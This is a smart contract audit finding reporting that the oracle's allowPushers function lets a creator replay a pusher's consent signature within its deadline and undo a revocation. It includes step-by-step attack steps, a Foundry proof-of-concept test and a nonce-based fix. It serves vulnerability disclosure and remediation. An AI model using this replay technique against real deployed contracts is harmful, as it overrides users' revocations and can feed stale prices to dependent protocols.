### Title
`allowPushers` Consent Signature Is Replayable Within Its Deadline Window, Allowing a Creator to Silently Re-Establish a Revoked Pusher Delegation — (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowPushers` contains no nonce and no check for whether a pusher has previously revoked their delegation. A creator who holds a valid (non-expired) pusher consent signature can replay it after the pusher calls `revokePusher()`, immediately re-establishing the delegation. The pusher's revocation is ineffective until the deadline timestamp expires, which can be days away.

---

### Finding Description

`allowPushers` verifies an EIP-191 signature over `(chainid, oracle, deadline, pusher, creator)` and unconditionally writes `namespaceRemapping[pusher] = msg.sender`. [1](#0-0) 

There is no nonce, no "revoked" flag, and no check that `namespaceRemapping[pusher]` was previously cleared by the pusher. The only replay protection is the deadline, which prevents re-establishment *after* the deadline expires but not *within* the deadline window.

`revokePusher` clears the mapping: [2](#0-1) 

But because `allowPushers` accepts the same signature again without any state tracking of prior revocations, the creator can immediately undo the revocation:

**Step-by-step attack:**
1. Pusher P signs consent for creator A with `deadline = block.timestamp + 1 days`.
2. Creator A calls `allowPushers(deadline, [P], [sig])` → `namespaceRemapping[P] = A`.
3. Pusher P calls `revokePusher()` → `namespaceRemapping[P] = 0`.
4. Creator A immediately replays the **same** `sig` via `allowPushers(deadline, [P], [sig])` → `namespaceRemapping[P] = A` again.
5. Steps 3–4 repeat indefinitely until `deadline` expires.

The code comment itself acknowledges the deadline is the only guard against post-revocation replay: [3](#0-2) 

The comment says "an undated signature could re-establish a delegation after the pusher revoked it" — but the dated signature with a future deadline has exactly the same problem within the deadline window.

---

### Impact Explanation

- The pusher cannot effectively stop their data from being attributed to the creator's namespace until the deadline expires.
- If the pusher stops pushing (believing they have successfully revoked), the creator's namespace receives no further updates and becomes stale.
- Stale slot data (`timestamp` stops advancing) is the exact condition that downstream consumers — including `AnchoredPriceProvider._readLeg` — rely on `MAX_REF_STALENESS` to catch. [4](#0-3) 

If `MAX_REF_STALENESS` is set to a generous window (e.g., minutes), the pool continues to consume the last stale price pushed before the pusher stopped, which is a bad-price execution path. The pusher also cannot push into their own namespace during this period — their fallback pushes still land in the creator's namespace because the remapping is re-established. [5](#0-4) 

---

### Likelihood Explanation

- Deadlines are caller-supplied and typically set to hours or days in the future (the test suite uses `block.timestamp + 1 days`).
- The creator holds the signature off-chain and can replay it in the same block as the pusher's revocation.
- No privileged role is required; the creator is a semi-trusted but valid actor in the contest scope.
- The pusher has no on-chain way to invalidate the signature before the deadline expires.

---

### Recommendation

Add a per-pusher nonce to the signed message and track consumed nonces on-chain:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender, pusherNonce[pusher]  // <-- include nonce
    ))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
pusherNonce[pusher]++;  // invalidate all prior signatures
namespaceRemapping[pusher] = msg.sender;
```

Alternatively, increment the nonce inside `revokePusher()` so that revocation immediately invalidates all outstanding consent signatures for that pusher, regardless of their deadline.

---

### Proof of Concept

```solidity
// Foundry test — extends CompressedOracleTest setup
function testRevokedDelegationCanBeReplayedByCreator() public {
    uint256 deadline = block.timestamp + 1 days;

    // 1. Pusher signs consent for creator
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);
    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // 2. Creator establishes delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator, "step2: delegated");

    // 3. Pusher revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0), "step3: revoked");

    // 4. Creator replays the SAME signature — succeeds, revocation undone
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator, "step4: re-delegated against pusher's will");

    // 5. Pusher pushes thinking they are in their own namespace — data lands in creator's
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw = _packRaw(1_000_000, 3, 5);
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
    assertTrue(ok);

    // Push landed in creator's namespace, not pusher's own
    assertEq(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price,
             U64x32.decode(uint32(raw >> 16)), "creator namespace updated");
    assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price,
             0, "pusher own namespace empty — pusher cannot reach it");
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-211)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L277-294)
```text
    function _readLeg(bytes32 feedId)
        internal returns (uint256 mid, uint256 spreadBps, uint256 refTime, bool ok)
    {
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);

        // Stale reference → not ok. Clamping to a stale anchor is the one false-safety case.
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);

        // Basic validity — mid positive, spreadBps not the stalled/off-hours marker (the Chainlink oracle
        // writes spreadBps = ORACLE_BPS when an RWA market is closed).
        if (mid == 0 || spreadBps >= ORACLE_BPS) return (mid, spreadBps, refTime, false);

        // Per-leg price guard.
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(feedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) return (mid, spreadBps, refTime, false);

        ok = true;
```
